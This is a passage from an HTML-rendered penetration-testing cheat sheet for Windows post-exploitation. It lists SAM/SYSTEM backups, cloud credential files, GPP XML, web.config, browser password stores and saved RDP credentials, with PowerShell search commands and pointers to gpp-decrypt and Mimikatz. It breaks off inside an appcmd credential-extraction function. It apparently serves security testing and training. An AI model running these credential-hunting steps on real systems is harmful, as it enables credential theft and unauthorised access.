</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="n">C</span><span class="p">:\</span><span class="n">unattend</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">C</span><span class="p">:\</span><span class="n">unattend</span><span class="p">.</span><span class="n">inf</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">*</span><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span> <span class="p">*</span><span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span> <span class="p">*</span><span class="n">unattended</span><span class="p">.</span><span class="n">xml</span> <span class="p">*</span><span class="n">unattend</span><span class="p">.</span><span class="n">xml</span> <span class="p">*</span><span class="n">unattend</span><span class="p">.</span><span class="n">txt</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
</span></code></pre></div></h2>
<h4 id="sam-system-backups">SAM &amp; SYSTEM BACKUPS</h4>
<h2 id="usually-systemroot-cwindows-systemrootrepairsam-systemrootsystem32configregbacksam-systemrootsystem32configsam-systemrootrepairsystem-systemrootsystem32configsystem-systemrootsystem32configregbacksystem"><div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">SAM</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">RegBack</span><span class="p">\</span><span class="n">SAM</span>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">SAM</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">system</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">SYSTEM</span>
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="k">%</span><span class="n">SYSTEMROOT</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">RegBack</span><span class="p">\</span><span class="n">system</span>
</span></code></pre></div></h2>
<h4 id="cloud-credentials">CLOUD CREDENTIALS</h4>
<h2 id="from-user-home-awscredentials-appdataroaminggcloudcredentialsdb-appdataroaminggcloudlegacy_credentials-appdataroaminggcloudaccess_tokensdb-azureaccesstokensjson-azureazureprofilejson"><div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c">##From user home</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="p">.</span><span class="n">aws</span><span class="p">\</span><span class="n">credentials</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">gcloud</span><span class="p">\</span><span class="n">credentials</span><span class="p">.</span><span class="n">db</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">gcloud</span><span class="p">\</span><span class="n">legacy_credentials</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">gcloud</span><span class="p">\</span><span class="n">access_tokens</span><span class="p">.</span><span class="n">db</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="p">.</span><span class="n">azure</span><span class="p">\</span><span class="n">accessTokens</span><span class="p">.</span><span class="n">json</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="p">.</span><span class="n">azure</span><span class="p">\</span><span class="n">azureProfile</span><span class="p">.</span><span class="n">json</span>
</span></code></pre></div></h2>
<h4 id="cached-gpp">CACHED GPP</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="s2">&quot;C:\ProgramData\Microsoft\Group Policy\history&quot;</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="s2">&quot;C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history&quot;</span> 
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">Groups</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">Services</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">Scheduledtasks</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="n">DataSources</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="n">Printers</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="n">Drives</span><span class="p">.</span><span class="n">xml</span>
</span></code></pre></div>
:information_source: To decrypt these passwords you can decrypt it using
- gpp-decrypt xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
<hr />
<h4 id="iis-web-config">IIS WEB CONFIG</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Get-Childitem</span> <span class="err">–</span><span class="n">Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span> <span class="n">-Include</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Config</span><span class="p">\</span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="nb">Get-Childitem</span> <span class="err">–</span><span class="n">Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span> <span class="n">-Include</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="nb">Get-Childitem</span> <span class="err">–</span><span class="n">Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span> <span class="n">-Include</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></code></pre></div>
<hr />
<h4 id="possible-filenames-containing-creds">POSSIBLE FILENAMES CONTAINING CREDS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nv">$env:APPDATA</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">vnc</span><span class="p">.</span><span class="n">ini</span><span class="p">,</span> <span class="n">ultravnc</span><span class="p">.</span><span class="n">ini</span><span class="p">,</span> <span class="p">*</span><span class="n">vnc</span><span class="p">*</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="n">php</span><span class="p">.</span><span class="n">ini</span> <span class="n">httpd</span><span class="p">.</span><span class="n">conf</span> <span class="n">httpd-xampp</span><span class="p">.</span><span class="n">conf</span> <span class="n">my</span><span class="p">.</span><span class="n">ini</span> <span class="n">my</span><span class="p">.</span><span class="n">cnf</span> <span class="p">(</span><span class="n">XAMPP</span><span class="p">,</span> <span class="n">Apache</span><span class="p">,</span> <span class="n">PHP</span><span class="p">)</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">SiteList</span><span class="p">.</span><span class="n">xml</span> <span class="c">#McAfee</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span> <span class="c">#PS-History</span>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="p">*.</span><span class="n">gpg</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="p">*.</span><span class="n">pgp</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="p">*</span><span class="n">config</span><span class="p">*.</span><span class="n">php</span>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="n">elasticsearch</span><span class="p">.</span><span class="n">y</span><span class="p">*</span><span class="n">ml</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="n">kibana</span><span class="p">.</span><span class="n">y</span><span class="p">*</span><span class="n">ml</span>
</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="p">*.</span><span class="n">p12</span>
</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="p">*.</span><span class="n">der</span>
</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="p">*.</span><span class="n">csr</span>
</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="p">*.</span><span class="n">cer</span>
</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="n">known_hosts</span>
</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a><span class="n">id_rsa</span>
</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="n">id_dsa</span>
</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="p">*.</span><span class="n">ovpn</span>
</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a><span class="n">anaconda-ks</span><span class="p">.</span><span class="n">cfg</span>
</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="n">hostapd</span><span class="p">.</span><span class="n">conf</span>
</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a><span class="n">rsyncd</span><span class="p">.</span><span class="n">conf</span>
</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a><span class="n">cesi</span><span class="p">.</span><span class="n">conf</span>
</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a><span class="n">supervisord</span><span class="p">.</span><span class="n">conf</span>
</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a><span class="n">tomcat-users</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a><span class="p">*.</span><span class="n">kdbx</span>
</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a><span class="n">KeePass</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a><span class="n">Ntds</span><span class="p">.</span><span class="n">dit</span>
</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a><span class="n">SAM</span>
</span><span id="__span-21-30"><a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a><span class="n">SYSTEM</span>
</span><span id="__span-21-31"><a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a><span class="n">FreeSSHDservice</span><span class="p">.</span><span class="n">ini</span>
</span><span id="__span-21-32"><a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a><span class="n">access</span><span class="p">.</span><span class="n">log</span>
</span><span id="__span-21-33"><a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a><span class="n">error</span><span class="p">.</span><span class="n">log</span>
</span><span id="__span-21-34"><a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a><span class="n">server</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-21-35"><a id="__codelineno-21-35" name="__codelineno-21-35" href="#__codelineno-21-35"></a><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-21-36"><a id="__codelineno-21-36" name="__codelineno-21-36" href="#__codelineno-21-36"></a><span class="n">setupinfo</span>
</span><span id="__span-21-37"><a id="__codelineno-21-37" name="__codelineno-21-37" href="#__codelineno-21-37"></a><span class="n">setupinfo</span><span class="p">.</span><span class="n">bak</span>
</span><span id="__span-21-38"><a id="__codelineno-21-38" name="__codelineno-21-38" href="#__codelineno-21-38"></a><span class="n">key3</span><span class="p">.</span><span class="n">db</span>         <span class="c">#Firefox</span>
</span><span id="__span-21-39"><a id="__codelineno-21-39" name="__codelineno-21-39" href="#__codelineno-21-39"></a><span class="n">key4</span><span class="p">.</span><span class="n">db</span>         <span class="c">#Firefox</span>
</span><span id="__span-21-40"><a id="__codelineno-21-40" name="__codelineno-21-40" href="#__codelineno-21-40"></a><span class="n">places</span><span class="p">.</span><span class="n">sqlite</span>   <span class="c">#Firefox</span>
</span><span id="__span-21-41"><a id="__codelineno-21-41" name="__codelineno-21-41" href="#__codelineno-21-41"></a><span class="s2">&quot;Login Data&quot;</span>    <span class="c">#Chrome</span>
</span><span id="__span-21-42"><a id="__codelineno-21-42" name="__codelineno-21-42" href="#__codelineno-21-42"></a><span class="n">Cookies</span>         <span class="c">#Chrome</span>
</span><span id="__span-21-43"><a id="__codelineno-21-43" name="__codelineno-21-43" href="#__codelineno-21-43"></a><span class="n">Bookmarks</span>       <span class="c">#Chrome</span>
</span><span id="__span-21-44"><a id="__codelineno-21-44" name="__codelineno-21-44" href="#__codelineno-21-44"></a><span class="nb">History </span>        <span class="c">#Chrome</span>
</span><span id="__span-21-45"><a id="__codelineno-21-45" name="__codelineno-21-45" href="#__codelineno-21-45"></a><span class="n">TypedURLsTime</span>   <span class="c">#IE</span>
</span><span id="__span-21-46"><a id="__codelineno-21-46" name="__codelineno-21-46" href="#__codelineno-21-46"></a><span class="n">TypedURLs</span>       <span class="c">#IE</span>
</span><span id="__span-21-47"><a id="__codelineno-21-47" name="__codelineno-21-47" href="#__codelineno-21-47"></a><span class="k">%</span><span class="n">SYSTEMDRIVE</span><span class="p">%\</span><span class="n">pagefile</span><span class="p">.</span><span class="n">sys</span>
</span><span id="__span-21-48"><a id="__codelineno-21-48" name="__codelineno-21-48" href="#__codelineno-21-48"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">debug</span><span class="p">\</span><span class="n">NetSetup</span><span class="p">.</span><span class="n">log</span>
</span><span id="__span-21-49"><a id="__codelineno-21-49" name="__codelineno-21-49" href="#__codelineno-21-49"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">sam</span>
</span><span id="__span-21-50"><a id="__codelineno-21-50" name="__codelineno-21-50" href="#__codelineno-21-50"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">system</span>
</span><span id="__span-21-51"><a id="__codelineno-21-51" name="__codelineno-21-51" href="#__codelineno-21-51"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">software</span><span class="p">,</span> <span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">repair</span><span class="p">\</span><span class="n">security</span>
</span><span id="__span-21-52"><a id="__codelineno-21-52" name="__codelineno-21-52" href="#__codelineno-21-52"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">iis6</span><span class="p">.</span><span class="n">log</span>
</span><span id="__span-21-53"><a id="__codelineno-21-53" name="__codelineno-21-53" href="#__codelineno-21-53"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">AppEvent</span><span class="p">.</span><span class="n">Evt</span>
</span><span id="__span-21-54"><a id="__codelineno-21-54" name="__codelineno-21-54" href="#__codelineno-21-54"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">SecEvent</span><span class="p">.</span><span class="n">Evt</span>
</span><span id="__span-21-55"><a id="__codelineno-21-55" name="__codelineno-21-55" href="#__codelineno-21-55"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="k">default</span><span class="p">.</span><span class="n">sav</span>
</span><span id="__span-21-56"><a id="__codelineno-21-56" name="__codelineno-21-56" href="#__codelineno-21-56"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">security</span><span class="p">.</span><span class="n">sav</span>
</span><span id="__span-21-57"><a id="__codelineno-21-57" name="__codelineno-21-57" href="#__codelineno-21-57"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">software</span><span class="p">.</span><span class="n">sav</span>
</span><span id="__span-21-58"><a id="__codelineno-21-58" name="__codelineno-21-58" href="#__codelineno-21-58"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">sav</span>
</span><span id="__span-21-59"><a id="__codelineno-21-59" name="__codelineno-21-59" href="#__codelineno-21-59"></a><span class="k">%</span><span class="n">WINDIR</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">CCM</span><span class="p">\</span><span class="n">logs</span><span class="p">\*.</span><span class="n">log</span>
</span><span id="__span-21-60"><a id="__codelineno-21-60" name="__codelineno-21-60" href="#__codelineno-21-60"></a><span class="k">%</span><span class="n">USERPROFILE</span><span class="p">%\</span><span class="n">ntuser</span><span class="p">.</span><span class="n">dat</span>
</span><span id="__span-21-61"><a id="__codelineno-21-61" name="__codelineno-21-61" href="#__codelineno-21-61"></a><span class="k">%</span><span class="n">USERPROFILE</span><span class="p">%\</span><span class="n">LocalS</span><span class="p">~</span><span class="n">1</span><span class="p">\</span><span class="n">Tempor</span><span class="p">~</span><span class="n">1</span><span class="p">\</span><span class="n">Content</span><span class="p">.</span><span class="n">IE5</span><span class="p">\</span><span class="n">index</span><span class="p">.</span><span class="n">dat</span>
</span></code></pre></div>
<hr />
<h4 id="saved-rdp-connections">SAVED RDP CONNECTIONS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c"># REGISTRY</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">HKEY_USERS</span><span class="p">\&lt;</span><span class="n">SID</span><span class="p">&gt;\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Terminal</span> <span class="n">Server</span> <span class="n">Client</span><span class="p">\</span><span class="n">Servers</span><span class="p">\</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Terminal</span> <span class="n">Server</span> <span class="n">Client</span><span class="p">\</span><span class="n">Servers</span><span class="p">\</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c"># LOCAL FILE</span>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">rdp</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="nb">get-content</span> <span class="p">.\</span><span class="n">config</span><span class="p">.</span><span class="n">rdp</span>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">username</span><span class="p">:</span><span class="n">s</span><span class="p">:</span><span class="n">Administrator</span>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">password</span><span class="p">:</span><span class="n">s</span><span class="p">:</span><span class="n">xxxxxxxxxxxxx</span>
</span></code></pre></div>
<hr />
<h4 id="recently-run-commands">RECENTLY RUN COMMANDS</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">HCU</span><span class="p">\&lt;</span><span class="n">SID</span><span class="p">&gt;\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Explorer</span><span class="p">\</span><span class="n">RunMRU</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">HKCU</span><span class="p">\&lt;</span><span class="n">SID</span><span class="p">&gt;\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Explorer</span><span class="p">\</span><span class="n">RunMRU</span>
</span></code></pre></div>
<hr />
<h4 id="remote-desktop-credential-manager">REMOTE DESKTOP CREDENTIAL MANAGER</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">%</span><span class="n">localappdata</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Desktop</span> <span class="n">Connection</span> <span class="n">Manager</span><span class="p">\</span><span class="n">RDCMan</span><span class="p">.</span><span class="n">settings</span>
</span></code></pre></div>
:information_source: Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files
You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module</p>
<hr />
<h4 id="appcmd">APPCMD</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">function</span> <span class="nb">Get-ApplicationHost</span> <span class="p">{</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>    <span class="nv">$OrigError</span> <span class="p">=</span> <span class="nv">$ErrorActionPreference</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>    <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="s2">&quot;SilentlyContinue&quot;</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>    <span class="c"># Check if appcmd.exe exists</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span>  <span class="p">(</span><span class="s2">&quot;$Env:SystemRoot\System32\inetsrv\appcmd.exe&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>        <span class="c"># Create data table to house results</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>        <span class="nv">$DataTable</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>        <span class="c"># Create and name columns in the data table</span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>        <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">)</span>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>        <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;pass&quot;</span><span class="p">)</span>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>        <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)</span>
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>        <span class="nv">$Null</span> <span class="p">=</span> <span class="nv">$DataTable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;vdir&quot;</span><span class="p">)</span>
